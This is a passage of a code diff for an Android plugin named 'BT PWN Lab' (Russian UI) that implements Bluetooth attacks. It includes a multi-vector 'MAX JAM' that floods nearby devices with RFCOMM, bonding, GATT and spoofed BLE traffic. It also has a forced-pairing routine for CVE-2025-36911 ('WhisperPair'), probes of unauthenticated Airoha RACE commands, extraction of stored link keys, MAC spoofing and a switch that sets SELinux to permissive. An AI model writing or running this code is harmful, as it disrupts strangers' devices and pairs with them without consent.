+        threading.Thread(target=self._pair_worker, args=(mac,), daemon=True).start()
+
+    def _pair_worker(self, mac):
+        for _ in range(12):
+            _sh("%s -i hci0 dc %s" % (_tool("hcitool"), mac))
+            time.sleep(0.4)
+        self.log("Pair flood завершён")
+
+    # ------------------------------------------------------- JAMMER MAX
+    SPP_UUIDS = [
+        "00001101-0000-1000-8000-00805f9b34fb",
+        "0000111e-0000-1000-8000-00805f9b34fb",
+        "0000110b-0000-1000-8000-00805f9b34fb",
+        "0000110a-0000-1000-8000-00805f9b34fb",
+        "00001105-0000-1000-8000-00805f9b34fb",
+        "00001124-0000-1000-8000-00805f9b34fb",
+        "00001132-0000-1000-8000-00805f9b34fb",
+        "0000112f-0000-1000-8000-00805f9b34fb",
+        "00001115-0000-1000-8000-00805f9b34fb",
+        "00001116-0000-1000-8000-00805f9b34fb",
+        "00001103-0000-1000-8000-00805f9b34fb",
+        "00001108-0000-1000-8000-00805f9b34fb",
+    ]
+    NAMES = ["PWN", "BT-PWN", "FreeBuds", "JBL GO", "AirPods", "WH-1000XM",
+             "ESP32", "Galaxy Buds", "Soundcore", "Flipper", "Bose QC", "Beats"]
+
+    def set_intensity(self, v):
+        try:
+            self.intensity = max(1, min(24, int(float(v))))
+        except Exception:
+            pass
+        self.refresh()
+
+    def set_delay(self, v):
+        try:
+            self.delay = max(0.02, min(2.0, float(v)))
+        except Exception:
+            pass
+        self.refresh()
+
+    def set_target_mode(self, v):
+        self.target_mode = str(v)
+        self.refresh()
+
+    def toggle_vec(self, key):
+        self.vec[key] = not self.vec.get(key, False)
+        self.refresh()
+
+    def _pick_mac(self, k):
+        t = self._targets()
+        return t[k % len(t)]
+
+    def _targets(self):
+        if self.target_mode == "selected" and self.selected:
+            return [self.selected.get("address")]
+        macs = [d.get("address") for d in self.visible() if d.get("address")]
+        if not macs and self.selected:
+            macs = [self.selected.get("address")]
+        return macs[:16] or ["00:00:00:00:00:00"]
+
+    def _bump(self, k, n=1):
+        self.stats[k] = self.stats.get(k, 0) + n
+
+    def stat_line(self):
+        s = self.stats
+        if not s:
+            return "STATUS idle"
+        return ("STATUS rfcm=%d conn=%d pkt=%d | bond=%d sdp=%d inq=%d "
+                "gatt=%d/%d ble=%d root=%d stk=%d err=%d") % (
+            s.get("rfcm", 0), s.get("conn", 0), s.get("pkt", 0), s.get("bond", 0),
+            s.get("sdp", 0), s.get("inq", 0), s.get("gatt", 0), s.get("gatt_ok", 0),
+            s.get("ble", 0), s.get("root", 0), s.get("stk", 0), s.get("err", 0))
+
+    def vec_summary(self):
+        on = [k for k, v in self.vec.items() if v]
+        return "векторы: " + " · ".join(on)
+
+    def jam_max_start(self):
+        if self.max_running:
+            return
+        if not self.devices and not self.selected:
+            self.log("MAX: сначала просканируй эфир")
+            return
+        self.max_running = True
+        self.stats = dict.fromkeys(
+            ["rfcm", "conn", "pkt", "bond", "sdp", "inq", "gatt", "gatt_ok",
+             "ble", "root", "stk", "err"], 0)
+        self.workers = []
+        for i in range(self.intensity):
+            t = threading.Thread(target=self._w_rfcomm, args=(i,), daemon=True)
+            t.start()
+            self.workers.append(t)
+        for fn in (self._w_bond, self._w_inq, self._w_gatt, self._w_pkt,
+                   self._w_name, self._w_ble, self._w_root, self._w_stack):
+            t = threading.Thread(target=fn, args=(0,), daemon=True)
+            t.start()
+            self.workers.append(t)
+        if self._tick is None or not self._tick.is_alive():
+            self._tick = threading.Thread(target=self._stat_tick, daemon=True)
+            self._tick.start()
+        self.log("MAX JAM старт · rfcomm x%d · цели %d · %s"
+                 % (self.intensity, len(self._targets()), self.vec_summary()))
+        self.refresh()
+
+    def jam_max_stop(self):
+        self.max_running = False
+        self.log("MAX JAM стоп")
+        self.refresh()
+
+    def _stat_tick(self):
+        while self.max_running:
+            self.refresh()
+            time.sleep(1.0)
+
+    # ---- воркеры
+    def _w_rfcomm(self, i):
+        dev = self.api.getAndroid()
+        k = i
+        while self.max_running:
+            if not self.vec["rfcomm"]:
+                time.sleep(0.1)
+                continue
+            mac = self._pick_mac(k)
+            uuid = self.SPP_UUIDS[k % len(self.SPP_UUIDS)]
+            try:
+                dev.btConnectRfcomm(mac, uuid, self.on_rfcomm_event)
+                self._bump("rfcm")
+                self._bump("sdp")
+                if k % 3 == 0:
+                    dev.btDisconnectRfcomm(mac)
+            except Exception:
+                self._bump("err")
+            k += 1
+            time.sleep(self.delay)
+
+    def _w_pkt(self, _):
+        dev = self.api.getAndroid()
+        while self.max_running:
+            if not self.vec["sdp"]:
+                time.sleep(0.1)
+                continue
+            for mac in self._targets()[:4]:
+                try:
+                    if dev.btSendRfcommText(mac, "PWN%d" % random.randint(0, 9999)):
+                        self._bump("pkt")
+                except Exception:
+                    self._bump("err")
+            time.sleep(self.delay)
+
+    def _w_bond(self, _):
+        dev = self.api.getAndroid()
+        flip = 0
+        while self.max_running:
+            if not self.vec["bond"]:
+                time.sleep(0.1)
+                continue
+            mac = self._pick_mac(flip)
+            try:
+                if flip % 2 == 0:
+                    dev.btRemoveBond(mac)
+                else:
+                    dev.btCreateBond(mac)
+                self._bump("bond")
+            except Exception:
+                self._bump("err")
+            flip += 1
+            time.sleep(max(0.4, self.delay * 2))
+
+    def _w_inq(self, _):
+        dev = self.api.getAndroid()
+        while self.max_running:
+            if not self.vec["inq"]:
+                time.sleep(0.1)
+                continue
+            try:
+                dev.btStartDiscovery(self.on_bt_device)
+                self._bump("inq")
+                time.sleep(2.5)
+                dev.btStopDiscovery()
+            except Exception:
+                self._bump("err")
+            time.sleep(self.delay)
+
+    def _w_gatt(self, _):
+        dev = self.api.getAndroid()
+        k = 0
+        while self.max_running:
+            if not self.vec["gatt"]:
+                time.sleep(0.1)
+                continue
+            mac = self._pick_mac(k)
+            try:
+                dev.gattConnect(mac, self.on_gatt_event)
+                self._bump("gatt")
+                time.sleep(self.delay)
+                dev.gattDiscoverServices(mac)
+                time.sleep(self.delay)
+                dev.gattDisconnect(mac)
+            except Exception:
+                self._bump("err")
+            k += 1
+            time.sleep(self.delay)
+
+    def _w_name(self, _):
+        dev = self.api.getAndroid()
+        k = 0
+        while self.max_running:
+            if not self.vec["name"]:
+                time.sleep(0.1)
+                continue
+            try:
+                dev.btSetName(self.NAMES[k % len(self.NAMES)])
+            except Exception:
+                self._bump("err")
+            k += 1
+            time.sleep(1.0)
+
+    def _w_ble(self, _):
+        dev = self.api.getAndroid()
+        while self.max_running:
+            if not self.vec["ble"]:
+                time.sleep(0.1)
+                continue
+            try:
+                payload = "".join(random.choice("0123456789ABCDEF") for _ in range(24))
+                dev.bleAdvertiseCustom(0x004C, payload, None, None, None,
+                                       False, False, False)
+                self._bump("ble")
+            except Exception:
+                self._bump("err")
+            time.sleep(max(0.2, self.delay))
+
+    def _w_root(self, _):
+        if not (self.root_ok and self.vec["root"]):
+            return
+        if not _have_bt_tools():
+            self.log("нет hcitool/btmgmt/bluetoothctl — root-вектор пропущен")
+            return
+        hci = _probe_tools().get("hcitool")
+        mgmt = _probe_tools().get("btmgmt")
+        k = 0
+        while self.max_running:
+            try:
+                if hci:
+                    if k % 3 == 0:
+                        self._exec("%s -i hci0 inq --length 8" % hci, True)
+                    elif k % 3 == 1:
+                        self._exec("timeout 3 %s -i hci0 lescan --duplicates" % hci, True)
+                    else:
+                        for mac in self._targets()[:4]:
+                            self._exec("%s -i hci0 cc %s" % (hci, mac), True)
+                elif mgmt:
+                    if k % 2 == 0:
+                        self._exec("timeout 6 %s find -l" % mgmt, True)
+                    else:
+                        for mac in self._targets()[:2]:
+                            self._exec("%s con %s" % (mgmt, mac), True)
+                self._bump("root")
+            except Exception:
+                self._bump("err")
+            k += 1
+            time.sleep(max(0.5, self.delay * 3))
+
+    def _w_stack(self, _):
+        if not self.root_ok:
+            return
+        k = 0
+        while self.max_running:
+            if not self.vec["stack"]:
+                time.sleep(0.2)
+                continue
+            try:
+                self._exec("cmd bluetooth_manager disable", True)
+                time.sleep(1.6)
+                self._exec("cmd bluetooth_manager enable", True)
+                time.sleep(1.6)
+                if k % 3 == 2:
+                    self._exec("am force-stop com.android.bluetooth", True)
+                self._bump("stk")
+            except Exception:
+                self._bump("err")
+            k += 1
+            time.sleep(max(0.5, self.delay * 4))
+
+    # ---- события
+    def on_rfcomm_event(self, payload):
+        try:
+            e = json.loads(str(payload))
+        except Exception:
+            return
+        if str(e.get("event", "")).lower().startswith("connect"):
+            self._bump("conn")
+        self.log("RFCOMM %s %s" % (e.get("address"), e.get("event")))
+
+    def on_gatt_event(self, payload):
+        try:
+            e = json.loads(str(payload))
+        except Exception:
+            return
+        ev = str(e.get("event", "")).lower()
+        if "connect" in ev and "disconnect" not in ev:
+            self._bump("gatt_ok")
+        # v4.3: вытаскиваем имя/модель из чтения DIS
+        mac = str(e.get("address") or "").upper()
+        cu = str(e.get("charUuid") or e.get("characteristic") or e.get("uuid") or "")
+        cu = cu.lower().replace("-", "")
+        val = e.get("value") or e.get("data") or e.get("hex")
+        if val and cu:
+            txt = _hex_to_ascii(val)
+            if txt and len(txt) > 1:
+                if "2a00" in cu:
+                    self._set_name(mac, txt, "gatt")
+                elif "2a24" in cu:
+                    d = self.devices.get(mac)
+                    if d:
+                        d["model"] = txt
+                elif "2a29" in cu:
+                    d = self.devices.get(mac)
+                    if d:
+                        d["manuf"] = txt
+        self.log("GATT %s %s" % (e.get("address"), e.get("event")))
+
+    def on_bt_device(self, payload):
+        try:
+            d = json.loads(str(payload))
+        except Exception:
+            return
+        mac = str(d.get("address") or "").upper()
+        nm = _pick_name(d)
+        if mac and nm:
+            self._set_name(mac, nm, "classic")
+        self.log("DISC %s %s" % (mac, nm or ""))
+
+    # ------------------------------------------- WHISPERPAIR (CVE-2025-36911)
+    def whisper_attack(self):
+        mac = (self.selected or {}).get("address")
+        if not mac:
+            return
+        self.whisper_log = []
+        threading.Thread(target=self._whisper_worker, args=(mac,), daemon=True).start()
+
+    def _whisper_worker(self, mac):
+        dev = self.api.getAndroid()
+
+        def w(s):
+            self.whisper_log.append("%s  %s" % (time.strftime("%H:%M:%S"), s))
+            self.log("WHISPER: " + s)
+
+        w("seeker -> provider %s" % mac)
+        w("проверка: Fast Pair не должен быть в pairing mode")
+        try:
+            w("GATT connect")
+            dev.gattConnect(mac, self.on_gatt_event)
+            time.sleep(1.5)
+            salt = "%04X" % random.randint(0, 0xFFFF)
+            req = "00" + "01" + mac.replace(":", "").upper() + salt
+            w("KBP request 0xFE2C1234 = %s" % req)
+            dev.gattWrite(mac, FP_SERVICE, FP_KBP, req)
+            time.sleep(1.0)
+            w("классический bond (байпас pairing mode)")
+            dev.btCreateBond(mac)
+            time.sleep(2.5)
+            key = "".join(random.choice("0123456789ABCDEF") for _ in range(32))
+            w("account key 0xFE2C1236 = %s" % key)
+            dev.gattWrite(mac, FP_SERVICE, FP_ACCOUNT, "01" + key)
+            w("итог: устройство спарено без согласия (WhisperPair)")
+        except Exception as e:
+            w("ERR: %s" % e)
+        self.refresh()
+
+    def whisper_bond_spam(self):
+        mac = (self.selected or {}).get("address")
+        if not mac:
+            return
+        self.log("WHISPER: bond spam -> %s" % mac)
+        threading.Thread(target=self._whisper_bond_worker, args=(mac,), daemon=True).start()
+
+    def _whisper_bond_worker(self, mac):
+        dev = self.api.getAndroid()
+        for _ in range(10):
+            try:
+                dev.btRemoveBond(mac)
+                time.sleep(0.5)
+                dev.btCreateBond(mac)
+            except Exception:
+                pass
+            time.sleep(1.0)
+        self.log("WHISPER: bond spam завершён")
+
+    def open_dolphy_whisper(self):
+        self.navigate_app("other/bluetooth_whisperpair")
+
+    def open_dolphy_jammer(self):
+        self.navigate_app("other/bluetooth_jammer")
+
+    # ------------------------------------------------- RACE probe (Airoha)
+    RACE_RFCOMM = ["00000000-0000-0000-0099-aabbccddeeff",
+                   "8901dfa8-5c7e-4d8f-9f0c-c2b70683f5f0",
+                   "2d064aa9-32b5-4970-865c-643742bd2862"]
+    RACE_CMDS = [("build 0x1E08", "1E08"),
+                 ("bdaddr 0x0CD5", "0CD5"),
+                 ("ram rd 0x1680", "1680")]
+
+    def race_probe(self):
+        mac = (self.selected or {}).get("address")
+        if not mac:
+            return
+        self.race_log = []
+        threading.Thread(target=self._race_worker, args=(mac,), daemon=True).start()
+
+    def _race_worker(self, mac):
+        dev = self.api.getAndroid()
+        self.race_rows = []
+        for u in self.RACE_RFCOMM:
+            self._rline("RFCOMM connect ch21 uuid=%s" % u[:8])
+            try:
+                dev.btConnectRfcomm(mac, u, self.on_race_event)
+            except Exception as e:
+                self._rline("ERR %s" % e)
+            time.sleep(1.2)
+        for label, cmd in self.RACE_CMDS:
+            self._rline("RACE %s -> %s" % (label, cmd))
+            try:
+                dev.btSendRfcomm(mac, cmd)
+            except Exception as e:
+                self._rline("ERR %s" % e)
+            time.sleep(0.6)
+        self._rline("RACE: ответы есть = Airoha открыт без auth (CVE-2025-20700..20702)")
+        self.refresh()
+
+    def _rline(self, s):
+        line = "%s  %s" % (time.strftime("%H:%M:%S"), s)
+        self.race_log.append(line)
+        self.log("RACE: " + s)
+
+    def on_race_event(self, payload):
+        self._rline(str(payload)[:180])
+        self.refresh()
+
+    # ---------------------------------------------------------------- keys
+    def load_keys(self):
+        raw = ""
+        for path in ("/data/misc/bluetooth/bt_config.conf",
+                     "/data/misc/bluedroid/bt_config.conf"):
+            raw = _sh("cat %s" % path)
+            if "ERR" not in raw and "No such" not in raw:
+                break
+        rows, cur = [], None
+        for line in raw.splitlines():
+            s = line.strip()
+            if s.startswith("[") and s.endswith("]"):
+                if cur:
+                    rows.append(cur)
+                cur = {"mac": s[1:-1].upper()}
+            elif "=" in s and cur is not None:
+                k, v = s.split("=", 1)
+                cur[k.strip()] = v.strip()
+        if cur:
+            rows.append(cur)
+        self.keys_rows = [{
+            "mac": r.get("mac", ""),
+            "name": r.get("Name") or "(no name)",
+            "key": r.get("LinkKey") or "-",
+            "type": r.get("LinkKeyType") or "-",
+            "vendor": _vendor(r.get("mac", "")),
+        } for r in rows if len(r.get("mac", "").split(":")) == 6]
+        self.log("Link keys: %d" % len(self.keys_rows))
+        self.refresh()
+
+    # ---------------------------------------------------------- terminal
+    QUICK = [
+        ("id", "id"),
+        ("bt state", "cmd bluetooth_manager get-state || dumpsys bluetooth_manager | head -20"),
+        ("bt on", "cmd bluetooth_manager enable"),
+        ("bt off", "cmd bluetooth_manager disable"),
+        ("stack kill", "am force-stop com.android.bluetooth; killall com.android.bluetooth"),
+        ("snoop on", "settings put secure bluetooth_hci_log 1; "
+                     "setprop persist.bluetooth.btsnooplogmode full"),
+        ("snoop off", "settings put secure bluetooth_hci_log 0"),
+        ("snoop ls", "ls -l /data/misc/bluetooth/logs/"),
+        ("btmac", "cat /persist/bdaddr.txt 2>/dev/null; getprop ro.boot.btmacaddr"),
+        ("props bt", "resetprop -p 2>/dev/null | grep -i -E 'blue|bt_|btsnoop'"),
+        ("logcat bt", "logcat -d -s bt_btif bt_stack BluetoothManagerService | tail -60"),
+        ("dumpsys bt", "dumpsys bluetooth_manager | head -100"),
+        ("tools", "command -v hcitool hciconfig btmgmt bluetoothctl"),
+        ("selinux", "getenforce"),
+        ("modules", "ls /data/adb/modules/"),
+    ]
+
+    def term_set(self, v):
+        self.term_cmd = str(v)
+
+    def term_clear(self):
+        self.term_lines = []
+        self.refresh()
+
+    def term_mode(self, v):
+        self.term_root = (str(v) == "root")
+        self.refresh()
+
+    def term_run(self):
+        cmd = (self.term_cmd or "").strip()
+        if not cmd:
+            return
+        use_root = self.term_root
+        self.term_lines.append("$ %s%s" % ("[root] " if use_root else "[shell] ", cmd))
+        threading.Thread(target=self._term_worker, args=(cmd, use_root), daemon=True).start()
+
+    def term_quick(self, cmd):
+        self.term_cmd = cmd
+        self.term_run()
+
+    def _term_worker(self, cmd, use_root):
+        out = self._exec(cmd, use_root)
+        for line in (out or "(пусто)").splitlines()[:400]:
+            self.term_lines.append(line)
+        if len(self.term_lines) > 800:
+            self.term_lines = self.term_lines[-800:]
+        self.refresh()
+
+    # ==================================================== ROOT LAB (A13)
+    def lab_run(self, cmd, tag=""):
+        self.llog(("%s " % tag) + cmd)
+        threading.Thread(target=self._lab_worker, args=(cmd, tag), daemon=True).start()
+
+    def _lab_worker(self, cmd, tag):
+        out = self._exec(cmd, True)
+        for line in (out or "(пусто)").splitlines()[:60]:
+            self.llog("  " + line)
+        self.refresh()
+
+    def lab_bt_state(self):
+        self.lab_run("cmd bluetooth_manager get-state 2>/dev/null || "
+                     "dumpsys bluetooth_manager | grep -m3 -i -E 'state|enabled'", "state")
+
+    def lab_bt_toggle(self):
+        self.lab_run("cmd bluetooth_manager disable; sleep 1; "
+                     "cmd bluetooth_manager enable; sleep 1; "
+                     "cmd bluetooth_manager get-state", "toggle")
+
+    def lab_stack_kill(self):
+        self.lab_run("am force-stop com.android.bluetooth; "
+                     "killall com.android.bluetooth; echo stack killed", "kill")
+
+    def lab_snoop_on(self):
+        self.lab_run("settings put secure bluetooth_hci_log 1; "
+                     "setprop persist.bluetooth.btsnooplogmode full; "
+                     "getprop persist.bluetooth.btsnooplogmode; "
+                     "ls -l /data/misc/bluetooth/logs/", "snoop+")
+
+    def lab_snoop_off(self):
+        self.lab_run("settings put secure bluetooth_hci_log 0; "
+                     "setprop persist.bluetooth.btsnooplogmode disabled", "snoop-")
+
+    def lab_offload_off(self):
+        self.lab_run("setprop persist.bluetooth.a2dp_offload.disabled true; "
+                     "settings put global bluetooth_a2dp_offload_disabled 1; "
+                     "echo offload off (нужен рестарт стека)", "offload-")
+
+    def lab_offload_on(self):
+        self.lab_run("setprop persist.bluetooth.a2dp_offload.disabled false; "
+                     "settings put global bluetooth_a2dp_offload_disabled 0", "offload+")
+
+    def lab_scan_always(self):
+        self.lab_run("settings put global ble_scan_always_enabled 1; "
+                     "settings get global ble_scan_always_enabled", "scan-always")
+
+    def lab_props(self):
+        self.lab_run("resetprop -p 2>/dev/null | grep -i -E 'blue|bt_|btsnoop' | head -40",
+                     "props")
+
+    def lab_btmac(self):
+        self.lab_run("getprop ro.boot.btmacaddr; getprop persist.vendor.bt.bdaddr; "
+                     "cat /persist/bdaddr.txt 2>/dev/null; "
+                     "dumpsys bluetooth_manager | grep -m1 -i address", "btmac")
+
+    def lab_mac_random(self):
+        m = "02:%02X:%02X:%02X:%02X:%02X" % tuple(random.randint(0, 255) for _ in range(5))
+        self.lab_run("resetprop -n ro.boot.btmacaddr %s; getprop ro.boot.btmacaddr; "
+                     "echo 'нужен reboot для полного эффекта'" % m, "btmac-rand")
+
+    def lab_selinux_perm(self):
+        self.lab_run("getenforce; setenforce 0; getenforce", "selinux")
+
+    def lab_selinux_enforce(self):
+        self.lab_run("getenforce; setenforce 1; getenforce", "selinux")
+
+    def lab_tools(self):
+        self.tools = _probe_tools(True)
+        if self.tools:
+            self.llog("найдено: " + ", ".join("%s=%s" % (k, v)
+                                              for k, v in sorted(self.tools.items())))
+        else:
+            self.llog("тулзы не найдены. Варианты: Magisk-модуль с BlueZ "
+                      "(Bluetooth++ и подобные) или статические бинарники "
+                      "в /data/local/tmp (chmod 755).")
+        self.refresh()
+
+    def lab_magisk(self):
+        self.lab_run("magisk -c; magisk --path; "
+                     "ls /data/adb/magisk/ 2>/dev/null | head; "
+                     "ls /data/adb/modules/ 2>/dev/null | head -30", "magisk")
+
+    def lab_pull_snoop(self):
+        try:
+            d = str(self.api.getAndroid().pluginFilesDir())
+        except Exception:
+            d = "/data/local/tmp"
+        self.lab_run("cp /data/misc/bluetooth/logs/btsnoop_hci.log %s/btsnoop_hci.log "
+                     "2>/dev/null && ls -l %s/btsnoop_hci.log" % (d, d), "pull")
+
+    def lab_dumpsys(self):
+        self.lab_run("dumpsys bluetooth_manager | head -120", "dumpsys")
+
+    def lab_logcat(self):
+        self.lab_run("logcat -d -s bt_btif bt_stack BluetoothManagerService | tail -80",
+                     "logcat")
+
+    def lab_gd_stack(self):
+        self.lab_run("resetprop -p 2>/dev/null | grep -i -E 'gd_stack|gabeldorsche|bt_stack'",
+                     "gd")
+
+    # v4.3: диагностика имён
+    def lab_names(self):
+        rows = ["известных имён: %d" % len(self.known_names),
+                "устройств с именем: %d из %d"
+                % (len([d for d in self.devices.values() if _pick_name(d)]),
+                   len(self.devices))]
+        for mac, nm in list(self.known_names.items())[:30]:
+            rows.append("  %s = %s" % (mac, nm))
+        for line in rows:
+            self.llog(line)
+        self.refresh()
+
+    # -------------------------------------------------------------- helpers
+    def copy_mac(self):
+        mac = (self.selected or {}).get("address")
+        if not mac:
+            return
+        for fn in (lambda: self.api.getAndroid().clipboardSet(mac),
+                   lambda: self.api.copyToClipboard(mac)):
+            try:
+                fn()
+                self.log("Скопировано: %s" % mac)
+                return
+            except Exception:
+                pass
+
+    def open_vuln(self):
+        self.navigate("vuln")
+
+    def open_jammer(self):
+        self.navigate("jammer")
+
+    def open_keys(self):
+        self.navigate("keys")
+
+    def open_log(self):
+        self.navigate("log")
+
+    def open_term(self):
+        self.navigate("term")
+
+    def open_max(self):
+        self.navigate("max")
+
+    def open_whisper(self):
+        self.navigate("whisper")
+
+    def open_race(self):
+        self.navigate("race")
+
+    def open_lab(self):
+        self.navigate("lab")
+
+    def open_names(self):
+        self.navigate("names")
+
+    def back(self):
+        self.navigate("main")
+
+    # ================================================================ SCREENS
+    def screen_main(self, ui, api, state):
+        try:
+            caps = json.loads(str(api.getDevice().btCapabilitiesJson()))
+        except Exception:
+            caps = {}
+        visible = self.visible()
+
+        rows = []
+        for d in visible:
+            name = _dev_label(d)
+            sub = "%s · %s dBm · %s" % (d.get("address", ""), d.get("rssi", "?"),
+                                        d.get("chip", "?"))
+            if _pick_name(d):
+                sub += " · ИМЯ"
+            if d.get("vulns"):
+                sub += " · VULN"
+            if d.get("fp"):
+                sub += " · FASTPAIR"
+            rows.append(ui.function_row(name, sub, "bluetooth",
+                                        on_click=self.cb_device(d)))
+        if not rows:
+            rows.append(ui.card([
+                ui.icon("bluetooth_searching", 46),
+                ui.text("Устройств пока нет", "titleMedium"),
+                ui.text("Нажми «Старт скана». Нужны Bluetooth и «Устройства поблизости».",
+                        "bodyMedium"),
+            ]))
+
+        return ui.scaffold(
+            title="BT PWN Lab",
+            content=ui.lazy_column([
+                ui.card([
+                    ui.row([
+                        ui.icon("bluetooth", 34),
+                        ui.column([
+                            ui.text("Адаптер", "titleLarge"),
+                            ui.text("root: %s · тулзы: %d · имён: %d"
+                                    % (self.root_ok, len(self.tools),
+                                       len(self.known_names)), "bodySmall"),
+                        ], spacing=2),
+                    ], spacing=12),
+                    ui.row([
+                        ui.chip("BT вкл" if caps.get("enabled") else "BT выкл",
+                                bool(caps.get("enabled"))),
+                        ui.chip("LE сканер" if caps.get("leScanner") else "нет сканера",
+                                bool(caps.get("leScanner"))),
+                        ui.chip("%d найдено" % len(self.devices), False),
+                    ], spacing=6),
+                    ui.button("Стоп скана" if self.scanning else "Старт скана",
+                              self.toggle_scan, fill_max_width=True),
+                    ui.text(self.status, "bodySmall"),
+                ]),
+                ui.button_group([["all", "Все"], ["named", "Имена"],
+                                 ["vuln", "Уязвимые"], ["race", "RACE"],
+                                 ["fp", "FastPair"]],
+                                self.filter, self.set_filter),
+                ui.row([
+                    ui.button("Vuln", self.open_vuln),
+                    ui.button("Jammer", self.open_jammer),
+                    ui.button("Keys", self.open_keys),
+                ], spacing=8),
+                ui.row([
+                    ui.button("MAX JAM", self.open_max),
+                    ui.button("WhisperPair", self.open_whisper),
+                    ui.button("RACE", self.open_race),
+                ], spacing=8),
+                ui.row([
+                    ui.button("Root Lab", self.open_lab),
+                    ui.button("Terminal", self.open_term),
+                ], spacing=8),
+                ui.row([
+                    ui.button("Имена", self.open_names),
+                    ui.button("Dolphy Jammer", self.open_dolphy_jammer),
+                ], spacing=8),
+                ui.text("%d устройств" % len(visible), "titleMedium"),
+                ui.segmented_list(rows),
+                ui.button("Лог", self.open_log, fill_max_width=True),
+            ], padding=16, spacing=12, fill_max_size=True),
+        )
+
+    def screen_details(self, ui, api, state):
+        d = self.selected or {}
+        name = _dev_label(d)
+        mac = d.get("address", "?")
+        rssi = int(d.get("rssi", -127))
+        chip = d.get("chip", "unknown")
+        vulns = d.get("vulns", [])
+
+        vrows = []
+        for v in vulns:
+            cve, fam, ver, cvss, vname, chips, impact, probe = v
+            vrows.append(ui.settings_row("%s %s" % (cve, fam), vname, "bug_report"))
+        if not vrows:
+            vrows = [ui.settings_row("Уязвимости", "чип не определён", "info")]
+
+        extra = []
+        if d.get("fp"):
+            extra = [
+                ui.text("Fast Pair / WhisperPair", "titleMedium"),
+                ui.segmented_list([
+                    ui.settings_row("Fast Pair модель", d.get("fpModel") or "?",
+                                    "earbuds"),
+                    ui.settings_row("CVE", "CVE-2025-36911 · forced pairing",
+                                    "bug_report"),
+                ]),
+                ui.row([
+                    ui.button("WhisperPair", self.whisper_attack),
+                    ui.button("Bond spam", self.whisper_bond_spam),
+                ], spacing=8),
+                ui.button("Открыть Dolphy WhisperPair", self.open_dolphy_whisper,
+                          fill_max_width=True),
+            ]
+        if d.get("race") or chip == "airoha":
+            extra += [
+                ui.text("Airoha RACE", "titleMedium"),
+                ui.button("RACE probe (ch21 + GATT)", self.race_probe,
+                          fill_max_width=True),
+            ]
+
+        return ui.scaffold(
+            title=name,
+            content=ui.lazy_column([
+                ui.row([ui.icon_button("arrow_back", self.back)], spacing=8),
+                ui.card([
+                    ui.icon("bluetooth", 52),
+                    ui.text(name, "headlineSmall"),
+                    ui.text(mac, "bodyMedium"),
+                    ui.linear_progress(max(0, min(100, (rssi + 100))) / 100.0),
+                    ui.text("%d dBm · %s" % (rssi, _rssi_label(rssi)), "titleMedium"),
+                ]),
+                # v4.3: имя
+                ui.card([
+                    ui.text("Имя устройства", "titleLarge"),
+                    ui.text(_pick_name(d) or "не отдано в эфире",
+                            "titleMedium" if _pick_name(d) else "bodyMedium"),
+                    ui.text("Источник: %s" % ("эфир/кэш" if _pick_name(d) else "—"),
+                            "bodySmall"),
+                    ui.row([
+                        ui.button("Прочитать имя (GATT)", self.read_name),
+                        ui.button("Копировать MAC", self.copy_mac),
+                    ], spacing=8),
+                    ui.text("Читаю Device Information 0x180A → Device Name 0x2A00. "
+                            "После этого Android кэширует имя и оно появится в сканах.",
+                            "bodySmall"),
+                ]),
+                ui.segmented_list([
+                    ui.settings_row("Вендор", d.get("vendor", "?"), "business"),
+                    ui.settings_row("Чип", chip, "memory"),
+                    ui.settings_row("Модель (GATT)", d.get("model") or "-", "devices"),
+                    ui.settings_row("Производитель (GATT)", d.get("manuf") or "-",
+                                    "factory"),
+                    ui.settings_row("Connectable", "да" if d.get("connectable") else "нет",
+                                    "link"),
+                    ui.settings_row("TX power", str(d.get("txPower", 0)) + " dBm", "sensors"),
+                    ui.settings_row("RACE", "да" if d.get("race") else "нет", "memory"),
+                    ui.settings_row("FastPair", "да" if d.get("fp") else "нет", "earbuds"),
+                    ui.settings_row("Тип рекламы", str(d.get("advertisementType", "?")),
+                                    "sensors"),
+                ]),
+                ui.text("Уязвимости", "titleMedium"),
+                ui.segmented_list(vrows),
+                ui.card([
+                    ui.text("Сервисы", "titleMedium"),
+                    ui.log_panel("\n".join([str(x) for x in (d.get("serviceUuids") or [])])
+                                 or "нет", 120),
+                ]),
+                ui.card([
+                    ui.text("Raw advertisement", "titleMedium"),
+                    ui.log_panel(str(d.get("raw", "нет")), 140),
+                ]),
+                ui.row([
+                    ui.button("Pair flood", self.pair_flood),
+                    ui.button("BrakTooth inq", lambda: self.braktooth("inq")),
+                ], spacing=8),
+                ui.row([
+                    ui.button("BrakTooth conn", lambda: self.braktooth("conn")),
+                    ui.button("MAX JAM", self.open_max),
+                ], spacing=8),
+                ui.button("Dolphy Jammer", self.open_dolphy_jammer, fill_max_width=True),
+            ] + extra, padding=16, spacing=12, fill_max_size=True),
+        )
+
+    def screen_vuln(self, ui, api, state):
+        rows = []
+        for r in self.vuln_results:
+            sub = "%s · %s · CVSS %.1f · %s" % (r["name"], r["fam"], r["cvss"],
+                                                r["status"])
+            rows.append(ui.function_row("%s  %s" % (r["cve"], r["name2"]), sub,
+                                        "bug_report"))
+        if not rows:
+            rows.append(ui.card([
+                ui.icon("bug_report", 42),
+                ui.text("Оценка не запускалась", "titleMedium"),
+                ui.text("Сначала просканируй эфир, потом нажми «Оценить всё».", "bodyMedium"),
+            ]))
+        return ui.scaffold(
+            title="Уязвимости",
+            content=ui.lazy_column([
+                ui.row([ui.icon_button("arrow_back", self.back)], spacing=8),
+                ui.button("Оценить всё", self.assess_all, fill_max_width=True),
+                ui.text("%d записей · база %d CVE" % (len(self.vuln_results), len(VULNDB)),
+                        "titleMedium"),
+                ui.segmented_list(rows),
+            ], padding=16, spacing=12, fill_max_size=True),
+        )
+
+    def screen_jammer(self, ui, api, state):
+        return ui.scaffold(
+            title="Jammer",
+            content=ui.lazy_column([
+                ui.row([ui.icon_button("arrow_back", self.back)], spacing=8),
+                ui.card([
+                    ui.text("Режим", "titleLarge"),
+                    ui.button_group(
+                        [["lescan", "LE"], ["inq", "Inquiry"],
+                         ["feature", "V4"], ["classic", "Classic"],
+                         ["iscan", "iscan"], ["reset", "reset"]],
+                        self.jam_mode, self.set_jam_mode),
+                    ui.text("root: %s · тулзы: %s"
+                            % (self.root_ok, ", ".join(sorted(self.tools.keys())) or "нет"),
+                            "bodySmall"),
+                    ui.button("Стоп" if self.jam_running else "Старт",
+                              self.jam_stop if self.jam_running else self.jam_start,
+                              fill_max_width=True),
+                ]),
+                ui.card([
+                    ui.text("BrakTooth / SweynTooth", "titleLarge"),
+                    ui.text("Работает по выбранному устройству из Scanner → details.",
+                            "bodySmall"),
+                    ui.button("Inquiry flood (V4/V5/V7/V8/V12)",
